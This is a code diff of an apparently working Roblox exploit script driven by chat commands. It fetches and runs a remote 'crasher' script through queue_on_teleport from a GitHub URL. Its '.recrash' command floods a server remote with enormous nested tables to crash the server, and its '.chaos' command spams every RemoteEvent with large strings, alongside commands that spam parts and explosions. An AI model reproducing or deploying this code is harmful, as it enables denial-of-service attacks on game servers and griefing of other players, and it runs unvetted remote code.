@@ -2,19 +2,75 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local StarterGui = game:GetService("StarterGui")
-
+local Workspace = game:GetService("Workspace")
 local LocalPlayer = Players.LocalPlayer
 local active = false
+
+pcall(function()
+    StarterGui:SetCore("SendNotification", {
+        Title = "resort";
+        Text = "resort load";
+        Duration = 3;
+    })
+end)
+
 if queue_on_teleport then
-    queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/codexvsberserkerxylo/scripts/refs/heads/main/crasher"))
+    queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/codexvsberkerxylo/scripts/refs/heads/main/crasher"))
 end
+
+local function spamParts(amount)
+    spawn(function()
+        for i = 1, amount do
+            local part = Instance.new("Part")
+            part.Size = Vector3.new(50, 50, 50)
+            part.Anchored = true
+            part.CFrame = CFrame.new(math.random(-1000, 1000), math.random(100, 500), math.random(-1000, 1000))
+            part.BrickColor = BrickColor.random()
+            part.Material = Enum.Material.Neon
+            part.Parent = Workspace
+            
+            local smoke = Instance.new("Smoke", part)
+            smoke.Size = 100
+            local fire = Instance.new("Fire", part)
+            fire.Size = 100
+            local sparkles = Instance.new("Sparkles", part)
+        end
+    end)
+end
+
+local function spamSounds(amount)
+    spawn(function()
+        for i = 1, amount do
+            local sound = Instance.new("Sound")
+            sound.SoundId = "rbxassetid://" .. math.random(1000000, 9999999)
+            sound.Volume = 10
+            sound.Looped = true
+            sound.Parent = Workspace
+            sound:Play()
+        end
+    end)
+end
+
+local function spamExplosions(amount)
+    spawn(function()
+        for i = 1, amount do
+            local explosion = Instance.new("Explosion")
+            explosion.Position = Vector3.new(math.random(-500, 500), math.random(0, 500), math.random(-500, 500))
+            explosion.BlastRadius = 100
+            explosion.BlastPressure = 1000000
+            explosion.Parent = Workspace
+            task.wait(0.1)
+        end
+    end)
+end
+
 LocalPlayer.Chatted:Connect(function(msg)
     if msg:lower() == ".resort" and not active then
         active = true
         pcall(function()
             StarterGui:SetCore("SendNotification", {
-                Title = "System";
-                Text = "Resort Loaded";
+                Title = "resort";
+                Text = "resort activated";
                 Duration = 3;
             })
         end)
@@ -29,9 +85,189 @@ LocalPlayer.Chatted:Connect(function(msg)
         end
     elseif msg:lower() == ".resort" and active then
         StarterGui:SetCore("SendNotification", {
-            Title = "System";
-            Text = "Already Running";
+            Title = "resort";
+            Text = "already running";
             Duration = 2;
+        })
+    elseif msg:lower() == ".recrash" then
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "System";
+                Text = "recrash initiated";
+                Duration = 2;
+            })
+        end)
+        
+        shared.TeleportToSky = false
+        if shared.TeleportToSky then
+            local char = LocalPlayer.Character
+            char.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0)
+            task.wait(0.5)
+            char.HumanoidRootPart.Anchored = true
+        end
+        
+        spawn(function()
+            while wait(1.5) do
+                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge * math.huge)
+                local function getmaxvalue(val)
+                    local mainvalueifonetable = 499999
+                    if type(val) ~= "number" then
+                        return nil
+                    end
+                    local calculateperfectval = (mainvalueifonetable/(val+2))
+                    return calculateperfectval
+                end
+                
+                local function bomb(tableincrease, tries)
+                    local maintable = {}
+                    local spammedtable = {}
+                    
+                    table.insert(spammedtable, {})
+                    z = spammedtable[1]
+                    
+                    for i = 1, tableincrease do
+                        local tableins = {}
+                        table.insert(z, tableins)
+                        z = tableins
+                    end
+                    
+                    local calculatemax = getmaxvalue(tableincrease)
+                    local maximum
+                    
+                    if calculatemax then
+                        maximum = calculatemax
+                    else
+                        maximum = 999999
+                    end
+                    
+                    for i = 1, maximum do
+                        table.insert(maintable, spammedtable)
+                    end
+                    
+                    for i = 1, tries do
+                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+                    end
+                end
+                
+                bomb(289, 5)
+            end
+        end)
+    
+    elseif msg:lower() == ".lastresort" then
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "resort";
+                Text = "nuke activated";
+                Duration = 2;
+            })
+        end)
+        
+        spamParts(500)
+        spamExplosions(200)
+        
+        spawn(function()
+            while wait(0.5) do
+                spamExplosions(50)
+            end
+        end)
+    elseif msg:lower() == ".flood" then
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "resort";
+                Text = "flood activated";
+                Duration = 2;
+            })
+        end)
+        
+        spawn(function()
+            while wait(0.1) do
+                spamParts(100)
+            end
+        end)
+    elseif msg:lower() == ".chaos" then
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "resort";
+                Text = "chaos activated";
+                Duration = 2;
+            })
+        end)
+        
+        spamParts(1000)
+        spamSounds(100)
+        spamExplosions(500)
+        
+        spawn(function()
+            while wait(0.05) do
+                spamParts(50)
+                spamExplosions(25)
+            end
+        end)
+        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+            if remote:IsA("RemoteEvent") then
+                spawn(function()
+                    while wait() do
+                        for i = 1, 200 do
+                            remote:FireServer(string.rep("A", 10000))
+                        end
+                    end
+                end)
+            end
+        end
+    
+    elseif msg:lower() == ".earthquake" then
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "resort";
+                Text = "earthquake activated";
+                Duration = 2;
+            })
+        end)
+        
+        spawn(function()
+            while wait() do
+                for _, obj in pairs(Workspace:GetDescendants()) do
+                    if obj:IsA("BasePart") and obj.Anchored == false then
+                        obj.Velocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
+                        obj.RotVelocity = Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
+                    end
+                end
+            end
+        end)
+    
+    elseif msg:lower() == ".disco" then
+        pcall(function()
+            StarterGui:SetCore("SendNotification", {
+                Title = "resort";
+                Text = "disco activated";
+                Duration = 2;
+            })
+        end)
+        
+        spawn(function()
+            while wait(0.1) do
+                for i = 1, 50 do
+                    local part = Instance.new("Part")
+                    part.Size = Vector3.new(30, 30, 30)
+                    part.Anchored = true
+                    part.CFrame = CFrame.new(math.random(-500, 500), math.random(50, 300), math.random(-500, 500))
+                    part.BrickColor = BrickColor.random()
+                    part.Material = Enum.Material.Neon
+                    part.Parent = Workspace
+                    
+                    local light = Instance.new("PointLight", part)
+                    light.Brightness = 10
+                    light.Range = 100
+                    light.Color = Color3.new(math.random(), math.random(), math.random())
+                end
+            end
+        end)
+    
+    elseif msg:lower() == ".help" then
+        StarterGui:SetCore("SendNotification", {
+            Title = "resort";
+            Text = ".resort .recrash .nuke .flood .chaos .earthquake .disco";
+            Duration = 5;
         })
     end
 end)
